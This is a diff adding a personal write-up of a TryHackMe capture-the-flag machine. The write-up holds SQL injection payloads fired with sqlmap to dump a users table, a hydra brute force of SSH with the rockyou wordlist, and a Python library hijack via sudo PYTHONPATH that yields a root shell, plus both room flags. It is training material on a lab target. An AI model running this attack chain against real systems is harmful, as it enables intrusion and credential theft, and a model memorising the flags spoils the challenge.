@@ -326,3 +326,331 @@ Options:
     --current-db        Retrieve DBMS current database
     --passwords         Enumerate DBMS users password hashes
     --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+
+  General:
+    These options can be used to set some general working parameters
+
+    --batch             Never ask for user input, use the default behavior
+    --flush-session     Flush session files for current target
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    --wizard            Simple wizard interface for beginner users
+
+[!] to see full list of options run with '-hh'
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ ls
+admin.txt  blog.html  index.php  sql.txt
+```
+```text
+┌──(kali㉿kali)-[~/nappy] (from burp)
+└─$ cat sql.txt                      
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2022.8.2" exportTime="Tue Jan 10 17:56:32 EST 2023">
+  <item>
+    <time>Tue Jan 10 17:55:22 EST 2023</time>
+    <url><![CDATA[http://10.10.232.50:8000/login]]></url>
+    <host ip="10.10.232.50">10.10.232.50</host>
+    <port>8000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/login]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8xLjENCkhvc3Q6IDEwLjEwLjIzMi41MDo4MDAwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyOQ0KT3JpZ2luOiBodHRwOi8vMTAuMTAuMjMyLjUwOjgwMDANCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vMTAuMTAuMjMyLjUwOjgwMDAvbG9naW4NCkNvb2tpZTogc2Vzc2lvbj1leUpwWkNJNk1Td2liRzluWjJWa2FXNGlPblJ5ZFdVc0luVnpaWEp1WVcxbElqb2ljMjF2YTJWNUluMC5ZNzNxOXcuQUhZN09sT0NQSFVEN21XTVdhNnd0YUNfSjNBDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCnVzZXJuYW1lPXdpdHR5JnBhc3N3b3JkPXdpdHR5]]></request>
+    <status></status>
+    <responselength></responselength>
+    <mimetype></mimetype>
+    <response base64="true"></response>
+    <comment></comment>
+  </item>
+</items>
+
+sqlmap is an open-source command-line tool that automates the process of detecting and exploiting SQL injection vulnerabilities. The `-r` option is used to specify a file containing a list of HTTP requests to be tested for SQL injection vulnerabilities. The requests in the file must be in the format of HTTP request strings, such as those that can be exported from a web browser's developer tools.
+
+The -dbs option in `sqlmap` is used to enumerate the names of databases available on the target server after a successful SQL injection has been established. When this option is specified, `sqlmap` will attempt to retrieve a list of databases from the database management system (DBMS) and display them in the command-line interface. This can be useful for discovering the names of databases that contain sensitive information, which can then be targeted for further exploitation. It should be used after a successfull injection point identified.
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ sqlmap -r sql.txt --dbs --batch
+        ___
+       __H__                                                                                                                              
+ ___ ___[,]_____ ___ ___  {1.6.12#stable}                                                                                                 
+|_ -| . [)]     | .'| . |                                                                                                                 
+|___|_  [,]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:03:43 /2023-01-10/
+
+[20:03:43] [INFO] parsing HTTP request from 'sql.txt'
+[20:03:45] [INFO] resuming back-end DBMS 'mysql' 
+[20:03:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
+---
+[20:03:45] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[20:03:45] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] website
+
+[20:03:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'
+
+[*] ending @ 20:03:46 /2023-01-10/
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ sqlmap -r sql.txt -D website --tables --batch
+        ___
+       __H__                                                                                                                              
+ ___ ___[(]_____ ___ ___  {1.6.12#stable}                                                                                                 
+|_ -| . [(]     | .'| . |                                                                                                                 
+|___|_  [)]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:39:40 /2023-01-10/
+
+[20:39:40] [INFO] parsing HTTP request from 'sql.txt'
+[20:39:41] [INFO] resuming back-end DBMS 'mysql' 
+[20:39:41] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
+---
+[20:39:42] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[20:39:42] [INFO] fetching tables for database: 'website'
+Database: website
+[1 table]
++-------+
+| users |
++-------+
+
+[20:39:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'
+
+[*] ending @ 20:39:42 /2023-01-10/
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ sqlmap -r sql.txt -D website -T users --dump --batch
+        ___
+       __H__                                                                                                                              
+ ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
+|_ -| . ["]     | .'| . |                                                                                                                 
+|___|_  [.]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:40:36 /2023-01-10/
+
+[20:40:36] [INFO] parsing HTTP request from 'sql.txt'
+[20:40:36] [INFO] resuming back-end DBMS 'mysql' 
+[20:40:36] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
+---
+[20:40:37] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[20:40:37] [INFO] fetching columns for table 'users' in database 'website'
+[20:40:37] [INFO] fetching entries for table 'users' in database 'website'
+Database: website
+Table: users
+[1 entry]
++----+-------------------+----------------+----------+
+| id | email             | password       | username |
++----+-------------------+----------------+----------+
+| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
++----+-------------------+----------------+----------+
+
+[20:40:37] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.50/dump/website/users.csv'
+[20:40:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'
+
+[*] ending @ 20:40:37 /2023-01-10/
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ ssh smokey@10.10.232.50                             
+The authenticity of host '10.10.232.50 (10.10.232.50)' can't be established.
+ED25519 key fingerprint is SHA256:xpqbWswo65YJezxXRx18Va9jub3YGOEzi9N17Mhy9FE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.232.50' (ED25519) to the list of known hosts.
+smokey@10.10.232.50's password: My_P@ssW0rd123
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 11 Jan 2023 01:41:26 AM UTC
+
+  System load:  0.0               Processes:             113
+  Usage of /:   58.3% of 9.78GB   Users logged in:       0
+  Memory usage: 62%               IPv4 address for eth0: 10.10.232.50
+  Swap usage:   0%
+
+8 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Dec  7 03:21:42 2021 from 10.0.2.15
+smokey@biblioteca:~$ id
+uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
+smokey@biblioteca:~$ groups
+smokey
+smokey@biblioteca:/home/hazel$ su hazel
+Password: 
+su: Authentication failure
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ hydra -l hazel -P /usr/share/wordlists/rockyou.txt 10.10.232.50 ssh -V -t 64
+[22][ssh] host: 10.10.232.50   login: hazel   password: hazel
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 20 final worker threads did not complete until end.
+[ERROR] 20 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-10 20:58:33
+
+hazel:hazel (sometimes username is the pass)
+
+smokey@biblioteca:/home/hazel$ su hazel
+Password: 
+hazel@biblioteca:~$ cat user.txt 
+THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
+
+hazel@biblioteca:~$ cat hasher.py 
+import hashlib
+
+def hashing(passw):
+
+    md5 = hashlib.md5(passw.encode())
+
+    print("Your MD5 hash is: ", end ="")
+    print(md5.hexdigest())
+
+    sha256 = hashlib.sha256(passw.encode())
+
+    print("Your SHA256 hash is: ", end ="")
+    print(sha256.hexdigest())
+
+    sha1 = hashlib.sha1(passw.encode())
+
+    print("Your SHA1 hash is: ", end ="")
+    print(sha1.hexdigest())
+
+def main():
+    passw = input("Enter a password to hash: ")
+    hashing(passw)
+
+if __name__ == "__main__":
+    main()
+
+hazel@biblioteca:~$ python3 hasher.py 
+Enter a password to hash: hazel
+Your MD5 hash is: 16b9652df79d0e4784bdbf478c9f4fee
+Your SHA256 hash is: 9d053755e078005ef63af6258f5a743994a11d17daca304d49dec6c3ded3fba8
+Your SHA1 hash is: f29ae37cab5058050a41b21befb382f26a5688c4
+
+https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/
+
+hazel@biblioteca:~$ sudo -l
+Matching Defaults entries for hazel on biblioteca:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hazel may run the following commands on biblioteca:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
+
+hazel@biblioteca:/tmp$ cat hashlib.py 
+import os
+os.system("/bin/bash -p")
+hazel@biblioteca:/tmp$ chmod +x hashlib.py
+hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+root@biblioteca:/tmp# cat /root/root.txt
+THM{PytH0n_LiBr@RY_H1j@acKIn6}
+```
+![[Pasted image 20230110175516.png]]
+![[Pasted image 20230110175810.png]]
+What is the user flag?
+Weak password
+What is the root flag?
+
+## Flags / Answers
+- ***THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}***
+- ***THM{PytH0n_LiBr@RY_H1j@acKIn6}***
+
+## Notes / Lessons Learned
+[[Napping]]
+
